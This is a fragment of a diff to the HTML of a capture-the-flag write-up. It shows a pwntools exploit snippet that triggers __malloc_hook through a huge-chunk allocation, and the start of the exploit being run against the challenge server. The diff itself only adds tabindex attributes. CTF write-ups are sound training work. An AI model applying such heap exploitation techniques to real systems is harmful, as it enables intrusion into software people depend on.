-<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span> 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span> 
 <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">)</span> 
 <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span> 
         <span class="sa">b</span><span class="s2">&#34;4</span><span class="se">\n\x00\x00\x00</span><span class="s2">&#34;</span> <span class="o">+</span> 
@@ -807,7 +807,7 @@ $1 = {
 </span><span class="s2">&#34;&#34;&#34;</span>
 </code></pre></div><p>The <code>4\n\x00\x00\x00</code> corresponds to the option that asks for the huge chunk (we cannot allocate standards chunks anymore) which will trigger <code>__malloc_hook</code> :).</p>
 <p>Which gives:</p>
-<pre><code>root@3b9bf5405b71:/mnt# python3 exploit.py REMOTE HOST=167.172.56.180 PORT=30332
+<pre tabindex="0"><code>root@3b9bf5405b71:/mnt# python3 exploit.py REMOTE HOST=167.172.56.180 PORT=30332
 [*] '/mnt/once_and_for_all'
     Arch:     amd64-64-little
     RELRO:    Full RELRO
